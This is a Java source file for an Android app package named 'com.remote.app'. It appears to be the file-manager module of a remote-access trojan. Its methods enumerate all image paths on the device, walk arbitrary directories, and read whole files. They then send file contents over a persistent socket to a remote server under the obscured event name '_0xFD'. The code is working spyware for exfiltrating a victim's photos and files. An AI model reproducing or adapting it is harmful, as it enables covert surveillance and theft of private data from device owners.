package com.remote.app;

import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.util.Log;

import com.remote.app.socket.IOSocket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;


public class FileManager {


    public static JSONArray getAllShownImagesPath() {
        try {
            Uri uri;
            Cursor cursor;
            int column_index_data, column_index_folder_name;
            JSONArray listOfAllImages = new JSONArray();
            String absolutePathOfImage = null;
            uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

            String[] projection = {MediaStore.MediaColumns.DATA,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME};

            cursor = MainService.getContextOfApplication().getContentResolver().query(uri, projection, null,
                    null, null);

            column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
            column_index_folder_name = cursor
                    .getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
            while (cursor.moveToNext()) {
                absolutePathOfImage = cursor.getString(column_index_data);

                listOfAllImages.put(absolutePathOfImage);
            }
            return listOfAllImages;
        } catch (Exception ex){
            return new JSONArray();
        }
    }
    public static JSONArray walk(String path) {
        // Read all files sorted into the values-array
        JSONArray values = new JSONArray();
        File dir = new File(path);
        JSONObject fileObj = new JSONObject();
        boolean canRead = dir.canRead();

        try {
            fileObj.put("name", "../");
            fileObj.put("canRead", canRead);
            fileObj.put("parent", "./");
            fileObj.put("isDir", true);
            fileObj.put("path", dir.getParent());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        values.put(fileObj);

        if (!dir.canRead()) {
            return values;
        }

        try {
            File[] list = dir.listFiles();
            if (list != null && list.length >= 1) {
                for (File file : list) {
                    if (!file.getName().startsWith(".")) {
                        fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("canRead", true);
                        fileObj.put("parent", dir.getParent());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put("path", file.getAbsolutePath());
                        values.put(fileObj);
                    }
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }


        return values;
    }

    public static void downloadFile(String path) {
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()) {

            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put("type", "download");
                object.put("name", file.getName());

                object.put("path", file.getAbsolutePath());

                object.put("buffer", data);
                IOSocket.getInstance().getIoSocket().send("_0xFD", object);
                buf.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }


        }
    }

}
